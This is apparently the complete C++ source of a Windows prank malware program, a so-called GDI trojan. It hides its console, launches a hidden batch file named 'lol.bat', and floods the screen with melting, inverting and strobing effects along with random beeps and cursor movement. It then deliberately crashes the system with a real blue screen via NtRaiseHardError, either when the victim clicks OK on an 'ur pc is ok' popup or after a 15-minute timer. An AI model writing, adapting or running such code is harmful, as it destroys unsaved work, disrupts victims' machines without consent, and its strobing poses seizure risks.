#include <windows.h>
#include <gdiplus.h>
#include <ctime>
#include <math.h>
#include <process.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")

using namespace Gdiplus;

// ==========================================
// KERNEL DEFINITIONS (REAL BSOD)
// ==========================================
typedef NTSTATUS(NTAPI* pfnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void TriggerRealBSOD() {
    BOOLEAN bEnabled;
    ULONG uResp;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        auto RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        auto NtRaiseHardError = (pfnNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
        if (RtlAdjustPrivilege && NtRaiseHardError) {
            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled); 
            NtRaiseHardError(0xC0000420, 0, 0, NULL, 6, &uResp); 
        }
    }
}

// ==========================================
// CHAOS ENGINE (VISUALS & SOUND)
// ==========================================
void ChaosThread(void* arg) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    GdiplusStartupInput gsi;
    ULONG_PTR token;
    GdiplusStartup(&token, &gsi, NULL);

    while (true) {
        HDC hdc = GetDC(0);
        int effect = rand() % 10;

        // GDI Virus Beeps
        if (rand() % 5 == 0) {
            Beep((rand() % 1200) + 200, 80);
        }

        switch (effect) {
            case 0: BitBlt(hdc, rand() % 10, 10, w, h, hdc, 0, 0, SRCCOPY); break; // Melt
            case 1: BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY); break; // Invert
            case 2: StretchBlt(hdc, 15, 15, w - 30, h - 30, hdc, 0, 0, w, h, SRCCOPY); break; // Tunnel
            case 3: DrawIcon(hdc, rand() % w, rand() % h, LoadIcon(NULL, IDI_ERROR)); break;
            case 4: SetCursorPos(rand() % w, rand() % h); break;
            case 5: BitBlt(hdc, rand() % 40 - 20, rand() % 40 - 20, w, h, hdc, 0, 0, SRCCOPY); break; // Shake
            case 6: StretchBlt(hdc, w, 0, -w, h, hdc, 0, 0, w, h, SRCCOPY); break; // Flip
            case 7: { // RGB Strobe
                HBRUSH b = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
                SelectObject(hdc, b);
                PatBlt(hdc, 0, 0, w, h, PATINVERT);
                DeleteObject(b);
                break;
            }
            case 8: TextOutA(hdc, rand() % w, rand() % h, "UR PC IS OK", 11); break;
            case 9: InvertRect(hdc, &(RECT){rand()%w, rand()%h, rand()%w, rand()%h}); break;
        }
        ReleaseDC(0, hdc);
        Sleep(5);
    }
}

// ==========================================
// THREAD TO HANDLE THE POPUP SEPARATELY
// ==========================================
void PopupThread(void* arg) {
    MessageBoxA(NULL, "ur pc is ok", "System", MB_OK | MB_ICONINFORMATION | MB_SETFOREGROUND | MB_TOPMOST);
    // If they click OK, we trigger BSOD immediately
    TriggerRealBSOD();
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    srand((unsigned)time(0));
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

    // 1. Run lol.bat
    ShellExecuteA(NULL, "open", "lol.bat", NULL, NULL, SW_HIDE);

    // 2. Start Chaos Visuals/Sound
    _beginthread(ChaosThread, 0, NULL);

    // 3. Start the Popup in its own thread
    _beginthread(PopupThread, 0, NULL);

    // 4. THE 15-MINUTE TIMER (900,000 ms)
    ULONGLONG startTime = GetTickCount64();
    ULONGLONG duration = 15 * 60 * 1000; 

    while (true) {
        if (GetTickCount64() - startTime >= duration) {
            // Time is up! Force BSOD even if they didn't click OK.
            TriggerRealBSOD();
        }
        Sleep(1000); // Check once per second to save CPU
    }

    return 0;
}
